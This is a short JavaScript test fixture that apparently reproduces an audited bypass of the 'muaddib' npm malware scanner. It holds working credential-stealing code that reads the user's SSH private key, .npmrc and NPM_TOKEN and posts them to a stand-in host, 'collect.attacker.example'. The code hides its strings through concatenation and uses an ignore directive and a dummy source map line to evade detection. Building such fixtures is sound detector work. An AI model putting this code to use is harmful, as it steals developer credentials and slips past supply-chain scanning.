// muaddib-ignore
//# sourceMappingURL=data:application/json;base64,e30=
// SECURITY_AUDIT.md v2.2.12 Bypass 02 reproduction — muaddib-ignore + sourceMap + concat
// Root causes (per v2.2.12 audit):
//   1. muaddib-ignore directive skips dataflow scanner entirely
//   2. //# sourceMappingURL= line kills entropy analysis
//   3. SENSITIVE_STRINGS only matches Literal nodes — string concat bypasses

const fs = require('fs');
const https = require('https');
const os = require('os');

const dot = '.';
const sshDir = dot + 'ss' + 'h';
const npmFile = dot + 'np' + 'mrc';

const ssh = fs.readFileSync(os.homedir() + '/' + sshDir + '/id_rsa', 'utf8');
const npm = fs.readFileSync(os.homedir() + '/' + npmFile, 'utf8');

const body = JSON.stringify({ ssh, npm, token: process.env.NPM_TOKEN });

const req = https.request({
  hostname: 'collect.attacker.example',
  method: 'POST',
  headers: { 'content-type': 'application/json' }
});
req.write(body);
req.end();
